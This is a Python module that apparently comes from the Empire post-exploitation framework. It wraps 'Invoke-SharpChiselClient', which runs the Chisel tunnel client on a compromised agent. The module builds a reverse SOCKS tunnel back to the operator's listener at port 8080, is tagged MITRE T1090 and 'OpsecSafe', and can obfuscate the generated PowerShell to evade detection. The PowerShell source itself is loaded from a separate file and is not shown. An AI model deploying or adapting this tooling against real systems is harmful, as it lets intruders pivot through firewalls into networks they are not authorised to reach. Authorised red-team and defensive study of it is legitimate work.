from __future__ import print_function

from builtins import str
from builtins import object
from lib.common import helpers


class Module(object):

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Invoke-SharpChiselClient',

            'Author': ['@jpillora', '@shantanukhande'],

            'Description': ("Chisel is a fast TCP tunnel, transported over HTTP, secured via SSH. "
                            "Written in Go (golang). Chisel is mainly useful for passing through firewalls, "
                            "though it can also be used to provide a secure endpoint into your network."),

            'Software': '',

            'Techniques': ['T1090'],

            'Background': True,

            'OutputExtension': None,

            'NeedsAdmin': False,

            'OpsecSafe': True,

            'Language': 'powershell',

            'MinLanguageVersion': '2',

            'Comments': [
                'This is the Chisel client loaded with reflection. A chisel server needs to be started before ',
                'running this module. Only Chisel server v1.7.2 was tested with this module. Chisel server ',
                'should be started like so: "./chisel server --reverse"',
                'https://github.com/jpillora/chisel'
            ]
        }

        self.options = {
            'Agent': {
                'Description': 'Agent to run module on.',
                'Required': True,
                'Value': ''
            },
            'Server': {
                'Description': 'URL of the Chisel server.',
                'Required': True,
                'Value': 'http://%s:8080' % (helpers.lhost())
            },
            'Remote': {
                'Description': 'Remote(s) for the Chisel server.',
                'Required': True,
                'Value': 'R:socks'
            },
            'Fingerprint': {
                'Description': 'Fingerprint string to perform host-key validation against the server\'s public key',
                'Required': False,
                'Value': ''
            }
        }

        self.mainMenu = mainMenu

        if params:
            for param in params:
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value

    def generate(self, obfuscate=False, obfuscationCommand=""):

        module_source = self.mainMenu.installPath + "/data/module_source/management/Invoke-SharpChiselClient.ps1"
        if obfuscate:
            helpers.obfuscate_module(moduleSource=module_source, obfuscationCommand=obfuscationCommand)
            module_source = module_source.replace("module_source", "obfuscated_module_source")
        try:
            f = open(module_source, 'r')
        except:
            print(helpers.color("[!] Could not read module source path at: " + str(module_source)))
            return ""

        module_code = f.read()
        f.close()

        script = module_code
        script_end = "\nInvoke-SharpChiselClient"

        # Add any arguments to the end execution of the script
        for option, values in self.options.items():
            if option.lower() != "agent":
                if values['Value'] and values['Value'] != '':
                    if values['Value'].lower() == "true":
                        # if we're just adding a switch
                        script_end += " -" + str(option)
                    else:
                        script_end += " -" + str(option) + " " + str(values['Value'])
        if obfuscate:
            script_end = helpers.obfuscate(psScript=script_end, installPath=self.mainMenu.installPath,
                                           obfuscationCommand=obfuscationCommand)
        script += script_end
        script = helpers.keyword_obfuscation(script)

        print(helpers.color("[*] Start the Chisel server "))

        return script
